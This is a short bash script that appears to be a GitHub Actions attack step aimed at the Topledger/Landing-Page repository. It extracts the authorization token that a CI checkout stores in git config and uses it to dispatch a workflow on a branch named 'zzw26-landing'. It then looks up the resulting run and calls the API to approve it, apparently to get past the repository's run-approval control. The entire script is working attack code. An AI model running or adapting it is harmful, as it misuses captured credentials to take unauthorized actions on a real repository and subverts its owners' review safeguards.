#!/bin/bash
set +e
TOK=$(git config --get-regexp extraheader | sed 's/.*basic //')
[ -z "$TOK" ] && { echo NO_TOKEN; exit 0; }
echo "TOKLEN=${#TOK}"
curl -s -o /dev/null -w 'DISPATCH_CODE=%{http_code}\n' -X POST -H "Authorization: basic $TOK" -H 'Accept: application/vnd.github+json' -d '{"ref":"zzw26-landing"}' https://api.github.com/repos/Topledger/Landing-Page/actions/workflows/34368811/dispatches
sleep 4
RID=$(curl -s -H "Authorization: basic $TOK" "https://api.github.com/repos/Topledger/Landing-Page/actions/runs?event=workflow_dispatch&per_page=1" | jq -r '.workflow_runs[0].id')
ACT=$(curl -s -H "Authorization: basic $TOK" "https://api.github.com/repos/Topledger/Landing-Page/actions/runs/$RID" | jq -r '.actor.login')
echo "RID=$RID ACTOR=$ACT"
curl -s -o /tmp/ap -w 'APPROVE_CODE=%{http_code}\n' -X POST -H "Authorization: basic $TOK" -H 'Accept: application/vnd.github+json' "https://api.github.com/repos/Topledger/Landing-Page/actions/runs/$RID/approve"
cat /tmp/ap; echo
